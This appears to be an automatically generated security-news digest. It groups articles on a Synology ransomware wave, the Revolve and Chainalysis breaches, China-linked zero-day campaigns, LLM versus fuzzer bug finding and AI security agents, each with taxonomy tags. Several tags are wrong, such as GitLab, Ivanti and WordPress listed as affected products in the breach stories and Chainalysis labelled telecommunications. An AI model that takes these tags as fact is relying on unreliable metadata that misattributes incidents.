  - Summary: Summary Project Zero compared two automated tools used by Google to find vulnerabilities in Chrome’s JavaScript engine, V8, on a regular basis. Fuzzilli is a generative JavaScript engine fuzzer and BigSleep is an LLM-based bug finding system. In the past six months, BigSleep found more vulnerabilities than Fuzzilli (45 versus 37) with a 25% overlap in the specific bugs reported. Since this comparison methodology has a tendency to underestimate overlap, we also performed dedicated experiments to test theoretical overlap in vulnerabilities reported since 2023. These experiments estimated overlap at roughly 60%. Regardless of which value is accurate, a substantial portion of vulnerabilities were discoverable by only LLMs or only fuzzing. While it is extremely promising that LLMs have become able to find so many vulnerabilities so quickly, fuzzing and LLMs are still complementary approaches. We recommend vendors perform both fuzzing and agentic analysis of their code to maximize the number

### Cluster f402bd5782 — score 10

- Title: Synology warns of C3RB3R ransomware attacks targeting NAS devices
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-02T11:28:42+00:00
- Link: https://www.bleepingcomputer.com/news/security/synology-warns-customers-of-ongoing-c3rb3r-ransomware-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_products: Atlassian Confluence, GitLab
- cve_ids: CVE-2021-22205, CVE-2021-26084, CVE-2024-10441, CVE-2024-10445, CVE-2024-50629
- urgency_signals: no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_products: GitLab, Atlassian Confluence
- cve_ids: CVE-2024-10441, CVE-2024-50629, CVE-2024-10445, CVE-2021-26084, CVE-2021-22205
- urgency_signals: no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Taiwanese network-attached storage (NAS) appliance maker Synology warned customers to update their devices immediately due to a surge in C3RB3r ransomware attacks. [...]
```

#### Full body

```
Synology warns of C3RB3R ransomware attacks targeting NAS devices By Sergiu Gatlan November 2, 2026 06:28 AM 0 Taiwanese network-attached storage (NAS) appliance maker Synology warned customers to update their devices immediately due to a surge in C3RB3r ransomware attacks. The company urged users to enable automatic updates and upgrade the DiskStation Manager (DSM) software running on their NAS devices to the latest version to protect their data. "Synology has identified threat actors exploiting a vulnerability patched in December 2024 to target devices running outdated versions of DSM. These attacks aim to encrypt data and extort ransom," it said in a Thursday advisory . "Synology strongly urges all users running vulnerable versions to update DSM immediately to protect their systems. Synology also recommends enabling automatic updates to keep DSM up to date at all times." A Synology spokesperson was not immediately available when BleepingComputer reached out for more information on these C3RB3r ransomware attacks. While Synology has yet to share which vulnerability is being exploited in these ongoing attacks, it linked to a November 2024 security advisory with information about patches released for vulnerabilities allowing attackers to execute arbitrary code (CVE-2024-10441), read files (CVE-2024-50629), and write files (CVE-2024-10445) on unpatched devices. Synology users are advised to immediately block access to the management web interface from the Internet and update their DSM software to block attackers' attempts to hack and encrypt their devices. Product Severity Fixed Release Availability DSM 7.2.2 Critical Upgrade to 7.2.2-72806-1 or above. DSM 7.2.1 Critical Upgrade to 7.2.1-69057-6 or above. DSM 7.2 Critical Upgrade to 7.2-64570-4 or above. DSM 7.1 Critical Upgrade to 7.1.1-42962-7 or above. DSM 6.2 Moderate Upgrade to 6.2.4-25556-8 or above. Synology rarely issues security advisories warning of attacks targeting its customers' devices, with the last such alert published in August 2019 following large-scale brute-force attacks that led to eCh0raix ransomware infections . Last week's advisory follows a massive wave of reports from Synology customers whose data was encrypted and who were prompted to buy "C3rb3r Decryptor" tool from a dark web portal for thousands of dollars. The first reports surfaced more than two weeks ago , with affected users saying the ransomware dropped a ransom note (read-me3.txt) and added a .L0CK3D extension to encrypted files. "All your important files have been encrypted. Any attempts to restore your files with thrid-party software will be fatal for your files! The only way to decrypt your files safely is to buy the special decryption software 'C3rb3r Decryptor'," the ransom note warns. "At this page you will receive the complete instructions how to buy the decryption software for restoring all your files. Also at this page you will be able to restore any one file for free to be sure 'C3rb3r Decryptor' will help you." C3RB3R ransom note (BleepingComputer) The Cerber ransomware (also known as C3RB3R and CerberImposter), now deployed in attacks targeting Synology NAS devices, borrowed its name from a notorious Ransomware-as-a-Service (RaaS) with the same name that emerged in 2016 . Before disappearing at the end of 2019, the old Cerber ransomware operation accounted for more than 80% of all ransomware attacks and a quarter of all ransomware infections on enterprise endpoints. Starting in December 2021, when it was first spotted , C3RB3R was also deployed on Atlassian Confluence and GitLab servers as part of several attack waves exploiting remote code execution ( CVE-2021-26084 and CVE-2021-22205 ) and authentication bypass ( CVE-2023-22518 ) flaws. Internet threat watchdog Shadowserver now tracks over 380,000 Internet-exposed Synology NAS devices , but doesn't provide information on how many have already been secured against these attacks or are honeypots. Uncover email threats your existin
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Synology warns of C3RB3R ransomware attacks targeting NAS devices
  - Published: 2026-11-02T11:28:42+00:00
  - Link: https://www.bleepingcomputer.com/news/security/synology-warns-customers-of-ongoing-c3rb3r-ransomware-attacks/
  - Summary: Taiwanese network-attached storage (NAS) appliance maker Synology warned customers to update their devices immediately due to a surge in C3RB3r ransomware attacks. [...]

### Cluster 77167f8fc4 — score 10

- Title: Revolve Data Breach Impacts at Least 180,000 People
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-11-02T13:35:21+00:00
- Link: https://www.securityweek.com/revolve-data-breach-impacts-at-least-180000-people/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, supply_chain
- affected_industries: retail_ecommerce
- affected_products: GitLab, Ivanti, WordPress
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, data_breach
- affected_industries: retail_ecommerce
- affected_products: GitLab, Ivanti, WordPress
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers accessed its online shopping platform and stole customers’ personal and payment card information. The post Revolve Data Breach Impacts at Least 180,000 People appeared first on SecurityWeek .
```

#### Full body

```
Online fashion retailer Revolve is notifying at least 180,000 individuals that their personal and payment card information was stolen in a data breach. The incident occurred on September 11 and involved unauthorized access to certain systems, including the company’s online shopping platform. Immediately after learning of the cyberattack, Revolve initiated incident response and contained and remediated the unauthorized activity. The company’s investigation into the incident determined that the hackers may have accessed and exfiltrated the names, addresses, payment card numbers, and payment card expiration dates of customers who saved the data to their accounts on the company’s e-commerce platform. “This incident has not resulted in operational disruption or interrupted service to any customers, and as of the date of this report, the company does not believe this incident will have a material impact on its business,” Revolve said in a filing with the US Securities and Exchange Commission. The fashion retailer said it has notified law enforcement and retained a cybersecurity company to help with the remediation efforts. Advertisement. Scroll to continue reading. Last week, the company started notifying the potentially affected individuals of the data breach. Based on notices filed with the Attorney General’s offices in Iowa, Massachusetts, Texas, and Vermont, Revolve sent notification letters to at least 179,259 people. The company is not providing the affected individuals with free identity theft or credit monitoring services, but reminds them to review their account statements and remain vigilant for incidents of fraud or identity theft. Revolve has not shared the number of impacted individuals or details on who hacked it and how. SecurityWeek has emailed the company for additional information on the data breach and will update this article if it responds. Related: Chainalysis Discloses Data Breach Following AI-Driven Cyberattack Related: Over 41,000 DHS Employee Records Leaked Online Related: Vendor Key Leak Puts Data of 238,000 Denver Health Plan Members at Risk Related: Genesys Hack Exposes Customer Data From Internal Systems Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire PHP2Shell Attacks Root Palo Alto Firewalls but Fail Against WordPress Bulletproof Host Virtualine Loses Its Domain to FBI Seizure Fresh WordPress Vulnerability in Attackers’ Crosshairs Max-Severity GitLab Vulnerability Exploited Against Alpine Linux TeamViewer Flaw Could Let Malicious Hosts Take Over Support Technicians’ Machines Adobe, Veeam, Juniper Networks Patch Critical Vulnerabilities Over 41,000 DHS Employee Records Leaked Online HHS Filing Puts iRhythm Data Breach Toll at 8.2 Million Latest News Google Introduces $250,000 Root-in-Cloud Bug Bounty Reward Malicious Claude Code Extension Served in Cursor Supply Chain Attack Chainalysis Discloses Data Breach Following AI-Driven Cyberattack Polymarket Returns $3.9 Million to Traders as DebugBear Cites DNS Hijack FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist Ivanti Patches Two More Zero-Days Exploited in Connect Secure Attack Chain Northstar Security Exits Stealth With $7M to Expose Toxic Risk Combinations Syrian Hacker Gets Prison Time in US After Over a Decade on the Run Trending PHP2Shell Attacks Root Palo Alto Firewalls but Fail Against WordPress Northstar Security Exits Stealth With $7M to Expose Toxic Risk Combinations Malicious Claude Code Extension Served in Cursor Supply Chain Attack Syrian Hacker Gets Prison Time in US After Over a Decade on the Run Fresh WordPress Vulnerability in Attackers’ Crosshairs Passkeys Are Better Than Passwords. But They Are Not Enough. Drupal Commerce Core Vulnerability Exploited Against Online Stores $6 Billion Binance Hack Bears Hallmarks of Nor
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Revolve Data Breach Impacts at Least 180,000 People
  - Published: 2026-11-02T13:35:21+00:00
  - Link: https://www.securityweek.com/revolve-data-breach-impacts-at-least-180000-people/
  - Summary: Hackers accessed its online shopping platform and stole customers’ personal and payment card information. The post Revolve Data Breach Impacts at Least 180,000 People appeared first on SecurityWeek .

### Cluster 134597acf3 — score 10

- Title: Chainalysis Discloses Data Breach Following AI-Driven Cyberattack
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-11-02T10:27:49+00:00
- Link: https://www.securityweek.com/chainalysis-discloses-data-breach-following-ai-driven-cyberattack/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, supply_chain
- affected_industries: telecommunications
- affected_products: GitLab, Ivanti, WordPress
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, data_breach
- affected_industries: telecommunications
- affected_products: GitLab, Ivanti, WordPress
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The attackers used offensive agentic techniques to access the company’s systems and internal tools. The post Chainalysis Discloses Data Breach Following AI-Driven Cyberattack appeared first on SecurityWeek .
```

#### Full body

```
Blockchain analytics company Chainalysis has announced falling victim to an AI-driven cyberattack that resulted in a data breach. “This month, Chainalysis detected an external actor using offensive agentic techniques to gain unauthorized access to Chainalysis systems and internal tools,” the company said . The incident, it pointed out, is not related to the recent $6.36 billion Binance heist that was blamed on North Korean hackers. According to Chainalysis, the attack did not result in the compromise of investigation content, transaction or query results, passwords in clear text, or other credentials and secrets. “Some non-sensitive customer data, such as user IDs, full names, email addresses, and organization role labels for users provisioned on our platform were accessed, including such information relating to your organization and users,” Chainalysis said. The company continues to investigate the full scope of the data breach and has not disclosed how many individuals were potentially affected. Advertisement. Scroll to continue reading. “Our teams have been working around the clock to investigate unauthorized activity, patch vulnerabilities, and harden our systems,” it said. Chainalysis noted that it has observed an industry-wide rise in AI-driven cyberattacks, as many other tech platforms have been hit in recent weeks. The company has been working with external cybersecurity experts and LLMs to review its security posture and strengthen it against these evolving threats. Because names and email addresses were compromised, it recommends that users watch for unexpected authentication prompts and password reset requests, and make sure they have MFA enabled. Related: Polymarket Returns $3.9 Million to Traders as DebugBear Cites DNS Hijack Related: Over 41,000 DHS Employee Records Leaked Online Related: Hackers Steal 2.6 Million Records From Sony’s Japanese ISP So-net Related: HHS Filing Puts iRhythm Data Breach Toll at 8.2 Million Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire PHP2Shell Attacks Root Palo Alto Firewalls but Fail Against WordPress Bulletproof Host Virtualine Loses Its Domain to FBI Seizure Fresh WordPress Vulnerability in Attackers’ Crosshairs Max-Severity GitLab Vulnerability Exploited Against Alpine Linux TeamViewer Flaw Could Let Malicious Hosts Take Over Support Technicians’ Machines Adobe, Veeam, Juniper Networks Patch Critical Vulnerabilities Over 41,000 DHS Employee Records Leaked Online HHS Filing Puts iRhythm Data Breach Toll at 8.2 Million Latest News Revolve Data Breach Impacts at Least 180,000 People Google Introduces $250,000 Root-in-Cloud Bug Bounty Reward Malicious Claude Code Extension Served in Cursor Supply Chain Attack Polymarket Returns $3.9 Million to Traders as DebugBear Cites DNS Hijack FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist Ivanti Patches Two More Zero-Days Exploited in Connect Secure Attack Chain Northstar Security Exits Stealth With $7M to Expose Toxic Risk Combinations Syrian Hacker Gets Prison Time in US After Over a Decade on the Run Trending PHP2Shell Attacks Root Palo Alto Firewalls but Fail Against WordPress Northstar Security Exits Stealth With $7M to Expose Toxic Risk Combinations Malicious Claude Code Extension Served in Cursor Supply Chain Attack Syrian Hacker Gets Prison Time in US After Over a Decade on the Run Fresh WordPress Vulnerability in Attackers’ Crosshairs Passkeys Are Better Than Passwords. But They Are Not Enough. Drupal Commerce Core Vulnerability Exploited Against Online Stores $6 Billion Binance Hack Bears Hallmarks of North Korea’s TraderTraitor Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. We
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Chainalysis Discloses Data Breach Following AI-Driven Cyberattack
  - Published: 2026-11-02T10:27:49+00:00
  - Link: https://www.securityweek.com/chainalysis-discloses-data-breach-following-ai-driven-cyberattack/
  - Summary: The attackers used offensive agentic techniques to access the company’s systems and internal tools. The post Chainalysis Discloses Data Breach Following AI-Driven Cyberattack appeared first on SecurityWeek .

### Cluster d4d341f5f6 — score 10

- Title: China-Linked Hackers Exploited VMware ESX Zero-Day to Reduce Audit Trail Visibility
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-29T06:22:33+00:00
- Link: https://thehackernews.com/2026/10/china-linked-hackers-exploited-vmware.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-41709

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, vulnerability_disclosure, zero_day
- actor_attribution: UNC5221
- affected_industries: critical_infrastructure, government, legal_professional
- affected_products: Citrix, GitHub, Ivanti
- cve_ids: CVE-2026-102764, CVE-2026-41709
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage, vulnerability_disclosure
- actor_attribution: UNC5221
- affected_industries: government, critical_infrastructure, legal_professional
- affected_products: Citrix, GitHub, Ivanti
- cve_ids: CVE-2026-41709, CVE-2026-102764
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a security flaw impacting Broadcom VMware ESX to its Known Exploited Vulnerabilities (KEV) catalog, after CrowdStrike revealed that it had been weaponized by a China-nexus threat actor known as Warp Panda in attacks targeting the U.S. legal sector. The vulnerability in question is CVE-2026-41709 (CVSS score:
```

#### Full body

```
China-Linked Hackers Exploited VMware ESX Zero-Day to Reduce Audit Trail Visibility  Ravie Lakshmanan  Oct 29, 2026 Vulnerability / Cyber Espionage The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a security flaw impacting Broadcom VMware ESX to its Known Exploited Vulnerabilities ( KEV ) catalog, after CrowdStrike revealed that it had been weaponized by a China-nexus threat actor known as Warp Panda in attacks targeting the U.S. legal sector. The vulnerability in question is CVE-2026-41709 (CVSS score: 2.7), an a case of insufficient logging that could permit permit a malicious actor with admin access to perform certain operations without being logged. In an advisory released in July 2026, Broadcom revealed that the issue was addressed in the following versions - VMware Cloud Foundation SXi-9.1.0.0-25370933 and ESXi-9.0.2.0100-25595025 VMware vSphere Foundation SXi-9.1.0.0-25370933 and ESXi-9.0.2.0100-25595025 VMware ESX ESXi80U3j-25429389 VMware Cloud Foundation 5.2.4 VMware Telco Cloud Platform ESXi80U3j-25429389 The development comes in response to CrowdStrike's 2026 Legal Threat Landscape Report , which revealed that Warp Panda had exploited CVE-2026-41709 as a zero-day in early 2026 with an aim to reduce audit trail visibility. Warp Panda "exploits internet-facing edge devices using zero-day vulnerabilities and custom malware to maintain covert, persistent access," it said in the report shared with The Hacker News, adding the adversary "actively circumvents detection by bypassing audit logging, harvesting cloud session tokens, and registering rogue multi-factor authentication (MFA) devices." The threat actor, also tracked as Armory Castle (formerly UNC5221), Clay Typhoon, and VerdantBamboo, has a storied history of weaponizing zero-day vulnerabilities in Citrix NetScaler and Ivanti Connect Secure devices. Earlier this month, Google-owned Mandiant also attributed the hacking crew to the zero-day exploitation of a critical improper origin validation flaw in BeyondTrust Remote Support ( CVE-2026-102764 , CVSS score: 9.3) to deliver malware families like SAWFLY and BARECLAW. Attacks mounted by Warp Panda involve the exploitation of internet-facing edge devices to obtain initial access, after which the threat actor pivots to VMware vCenter environments to deploy custom malware like BRICKSTORM and SharpStorm to maintain persistent access without attracting attention. Select intrusions have also involved the targeting of cloud services with an aim to extract user session tokens to access Microsoft 365 environments sans raising any credential-based alerts. In at least one case, Warp Panda is said to have registered a new MFA device on a compromised account as a way to set up persistent access even if the password is changed. "Warp Panda represents a sustained and strategically focused China-nexus cyber espionage threat to U.S. entities across multiple sectors, including the legal sector," CrowdStrike said. "The legal sector's concentration of client communications, merger and acquisition materials, active litigation strategy, and cross-client access makes it a high-value collection target for a state-directed adversary seeking intelligence with downstream operational utility." In light of active exploitation of CVE-2026-41709, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply the fixes by November 11, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  cyber espionage , Nation-State , Virtualization Security , Vulnerability ⚡ Top Stories This Week Leaked LiteLLM Master Key Let Attackers Steal GitHub Tokens and Hijack Release Pipeline Chinese Hackers Use AI-Powered ARTEX to Target Over 200 Organizations Worldwide TeamViewer Flaw Lets Remote Computers Attack Users Who Connect to Control Them Official Claude Code Extension on Cursor Marketplace
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: China-Linked Hackers Exploited VMware ESX Zero-Day to Reduce Audit Trail Visibility
  - Published: 2026-10-29T06:22:33+00:00
  - Link: https://thehackernews.com/2026/10/china-linked-hackers-exploited-vmware.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a security flaw impacting Broadcom VMware ESX to its Known Exploited Vulnerabilities (KEV) catalog, after CrowdStrike revealed that it had been weaponized by a China-nexus threat actor known as Warp Panda in attacks targeting the U.S. legal sector. The vulnerability in question is CVE-2026-41709 (CVSS score:

### Cluster d20e88c36e — score 10

- Title: Volt Typhoon Used Covert Silent Train Network in Four Zero-Day Exploitation Campaigns
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-28T18:08:33+00:00
- Link: https://thehackernews.com/2026/10/volt-typhoon-used-covert-silent-train.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Volt Typhoon

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor, zero_day
- actor_attribution: UNC3236, Volt Typhoon
- affected_industries: aviation_defense, critical_infrastructure, government, telecommunications
- cve_ids: CVE-2024-39717, CVE-2025-8875, CVE-2025-8876, CVE-2026-16812, CVE-2026-20127
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage, web_shell_backdoor
- actor_attribution: Volt Typhoon, UNC3236
- affected_industries: government, critical_infrastructure, telecommunications, aviation_defense
- cve_ids: CVE-2024-39717, CVE-2025-8875, CVE-2025-8876, CVE-2026-20127, CVE-2026-16812
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The China-nexus cyber espionage group known as Volt Typhoon has been attributed to a now-disrupted covert access network dubbed Silent Train that has been put to use for zero-day exploitation and strategic access. "First identified in late 2023, Silent Train uses rotating chains of compromised SOHO, IoT, and enterprise infrastructure," Lumen Technologies Black Lotus Labs said in a report shared
```

#### Full body

```
Volt Typhoon Used Covert Silent Train Network in Four Zero-Day Exploitation Campaigns  Ravie Lakshmanan  Oct 28, 2026 Cyber Espionage / Vulnerability The China-nexus cyber espionage group known as Volt Typhoon has been attributed to a now-disrupted covert access network dubbed Silent Train that has been put to use for zero-day exploitation and strategic access. "First identified in late 2023, Silent Train uses rotating chains of compromised SOHO, IoT, and enterprise infrastructure," Lumen Technologies Black Lotus Labs said in a report shared with The Hacker News. "It employs anti-forensic techniques, compartmentalized operations, and post-operation cleanup to minimize detection and attribution." Its main purpose is to facilitate critical attack phases like vulnerability exploitation, credential access, data exfiltration, and to maintain continued access to victim environments. The activity stands out for two main reasons - It singled out entities that could provide scalable access to downstream customers, sensitive networks, or strategic programs. It targeted endpoint management platforms, network management systems, SD-WAN orchestrators, and control plane technologies that play a crucial role within enterprise environments. Hundreds of victims have been identified across telecommunications providers, government, defense contractors, satellite and mission-critical communication services, universities, IT firms, and critical infrastructure such as water, energy, transportation, maritime, rail, aviation, and emergency services. Volt Typhoon (aka Bronze Silhouette, Insidious Taurus, UNC3236, Vanguard Panda, and Voltzite) is the moniker assigned to a China-linked state-sponsored group known for its targeting of critical infrastructure networks, particularly communications, energy, transportation, and water and wastewater systems sectors. Known to be active since at least 2021, the threat actor was previously observed exploiting a file upload vulnerability in Versa Director as a zero-day (CVE-2024-39717) to deliver a bespoke web shell called VersaMem designed to harvest credentials and enable access to downstream customers. Silent Train session chains through multiple non-U.S. and U.S. hops The latest findings from Black Lotus Labs show that the security flaw was one among four confirmed zero-day campaigns the threat actor has conducted through Silent Train. The remaining three vulnerabilities are listed below - CVE-2025-8875 and CVE-2025-8876 - A set of insecure deserialization and command injection vulnerabilities in N-able N-central CVE-2026-20127 - An authentication bypass vulnerability in Cisco Catalyst SD-WAN Controller CVE-2026-16812 - An operating system command injection vulnerability in Arista VeloCloud Orchestrator Separately, Volt Typhoon is also suspected to have taken advantage of a likely zero-day vulnerability in Quest KACE before it was patched in October 2025 . The campaign is estimated to have impacted more than 30 victims. "Silent Train is built around rapidly rotating chains of compromised SOHO, IoT, and enterprise devices that are exploited on demand, used against carefully selected targets, cleaned up after each operation, and continuously refreshed," Black Lotus Labs said. "This model has enabled Volt Typhoon to conduct exploitation and post-exploitation operations with exceptional operational security while minimizing opportunities for detection, attribution, and disruption." A defining characteristic of these attacks is the repeated targeting of systems that can open the door to broad visibility, control, and access across large enterprise environments of strategic value to the U.S. What's interesting is that the covert access capability began to take shape sometime around November 2023, just weeks before the first round of disruption targeting KV-botnet , an IoT botnet linked to multiple China-nexus state-sponsored threat actors, including Volt Typhoon. Silent Train's operational activity is said to hav
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Volt Typhoon Used Covert Silent Train Network in Four Zero-Day Exploitation Campaigns
  - Published: 2026-10-28T18:08:33+00:00
  - Link: https://thehackernews.com/2026/10/volt-typhoon-used-covert-silent-train.html
  - Summary: The China-nexus cyber espionage group known as Volt Typhoon has been attributed to a now-disrupted covert access network dubbed Silent Train that has been put to use for zero-day exploitation and strategic access. "First identified in late 2023, Silent Train uses rotating chains of compromised SOHO, IoT, and enterprise infrastructure," Lumen Technologies Black Lotus Labs said in a report shared

### Cluster 7538659fd0 — score 9

- Title: Deploying a Local Ghidra Server for Your Malware Analysis Lab, (Thu, Oct 29th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-29T06:17:41+00:00
- Link: https://isc.sans.edu/diary/rss/33470
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Building your malware analysis lab is a key point before playing with malware. Today, thanks to virtualization, it&#;x26;#;39;s convenient to play with snapshots in your lab. Start a new investigation from a clean snapshot and take some more when you reached a critical step. But, if you need to revert to a previous snapshot, all changes applied to the VM are... lost! Therefore, it&#;x26;#;39;s important to store important data outside the VM.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Deploying a Local Ghidra Server for Your Malware Analysis Lab, (Thu, Oct 29th)
  - Published: 2026-10-29T06:17:41+00:00
  - Link: https://isc.sans.edu/diary/rss/33470
  - Summary: Building your malware analysis lab is a key point before playing with malware. Today, thanks to virtualization, it&#;x26;#;39;s convenient to play with snapshots in your lab. Start a new investigation from a clean snapshot and take some more when you reached a critical step. But, if you need to revert to a previous snapshot, all changes applied to the VM are... lost! Therefore, it&#;x26;#;39;s important to store important data outside the VM.

### Cluster e02e535e39 — score 9

- Title: From Reactive to Proactive: Empowering SOC Teams with the Wiz Red and Blue Agents
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-11-02T13:13:46+00:00
- Link: https://www.wiz.io/blog/soc-alerts-red-and-blue-agents
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Red Agent gives SOC teams validated pre-breach alerts, while Blue Agent investigates active threats at machine speed, helping teams stay ahead in the AI threat era.
```

#### Full body

```
Most SOC teams start investigating when a threat alert fires. Analysts triage the alert, piece together context, and begin an investigation, all after something has already happened. That model was built for a world where attackers moved at human speed and relied mostly on known exploits. That's no longer the case. Two shifts are happening at the same time, and both are changing the day-to-day for the SOC: • Organizations are shipping more custom code than ever: AI-assisted development means teams are building custom AI applications at unprecedented speed. These apps can contain logic-driven vulnerabilities, such as broken authorization and authentication bypasses, that are impossible to detect with signature-based scanners. • Attackers are using AI to move faster: Adversaries are using frontier AI models to scan perimeters, find exposed applications, and weaponize vulnerabilities in hours instead of months. AI also lowers the barrier to entry, so more attackers can probe custom applications for weaknesses, at greater scale than ever. For the SOC, that means the first sign of a logic flaw is often the breach itself. By the time a detection fires, the attacker has already chained their way in. Human-speed defense can't keep up with AI-powered offense. The only way to keep pace is to use AI to fight AI: find the open door before an attacker walks through it, and investigate at AI speed when someone does. This is critical for incident response in the AI era, and ensuring that the SOC can action at the speed required to defend the enterprise. Proactive security belongs in the SOC Gartner® makes the priority clear: Proactive, continuous threat exposure management (CTEM) with offensive testing will dominate SOC operations, as reactive detection yields an exponential increase in diminishing returns. Gartner Report, The Security Operations Roadmap to 2030, By Kevin Schmidt, Alex Tytarenko, etc., October 2026. Gartner is a trademark of Gartner, Inc. and/or its affiliates For the SOC, this means treating validated, exploitable exposures as what they are: attack paths that are proven exploitable. They deserve the same urgency as an active threat, because in the AI era, it's only a matter of time before attackers find them. That is the job of two Wiz agents working together: • The Red Agent , our AI-powered attacker that continuously finds and validates exploitable risk across your attack surface, and delivers it as pre-breach, SOC-level alerts . • The Blue Agent , our AI investigator that works alongside analysts to investigate active threats with full cloud, code, and runtime context, and reach a confident verdict fast. Red Agent: Pre-breach alerts your SOC can trust The Red Agent is an AI-powered pentester that enables teams to uncover complex, validated exploitable risks and remove them before attackers find them, at machine speed. It works alongside Wiz ASM to cover all types of risks- from known risks, such as CVEs and misconfigurations, to the unknown, logic-based risks in custom-built applications, like authorization bypasses that signature-based scanners miss. Every validated exploitable risk Red Agent finds is a ticking time bomb. Red Agent has already proven the exploit works, so the only open question is who gets there next: your team or an attacker. That calls for pre-breach urgency, not a place in the vulnerability backlog. Each finding arrives with proof of exploitability, reproduction steps, blast radius context from the Security Graph, and a clear owner and remediation guidance from the Green Agent. Instead of waiting for a detection, teams can shut down the attack path first and respond to fewer incidents. What is most amazing about Red Agent is the way that we can track and get alerting or visibility on endpoints that can be attacked or manipulated from the outside. It tells me: 'You have an endpoint here, you are missing authentication, you have an exposure.' All of those insights are really, really helping me to close
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: From Reactive to Proactive: Empowering SOC Teams with the Wiz Red and Blue Agents
  - Published: 2026-11-02T13:13:46+00:00
  - Link: https://www.wiz.io/blog/soc-alerts-red-and-blue-agents
  - Summary: Red Agent gives SOC teams validated pre-breach alerts, while Blue Agent investigates active threats at machine speed, helping teams stay ahead in the AI threat era.

### Cluster 5e394bf0a8 — score 9

- Title: Beyond Migration: Using Database Migration Service for disk shrinking
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-11-02T17:00:00+00:00
- Link: https://cloud.google.com/blog/products/databases/use-dms-to-shrink-cloud-sql-for-sql-server-disk/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 1
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
When database engineers hear “database migration", they typically think of a one-time onboarding pathway—moving databases from on-premises environments to the cloud, or between different cloud providers. However, Google Cloud's Database Migration Service (DMS) supports Cloud SQL for SQL Server as a source . This opens up powerful, non-traditional operational patterns for SQL Server customers within Google Cloud. Because DMS enables continuous, low-downtime database replication between Cloud SQL instances—whether in the same project, across different projects, or across regions—it can serve as an everyday utility for day-two operations like storage management. In this post, we explore a compelling operational use case for DMS with Cloud SQL for SQL Server: executing disk shrinks with minimal application downtime. Why should I shrink my disk? In many production environments, database storage only moves in one direction: up. Features like Cloud SQL automatic storage increase are essential
```

#### Full body

```
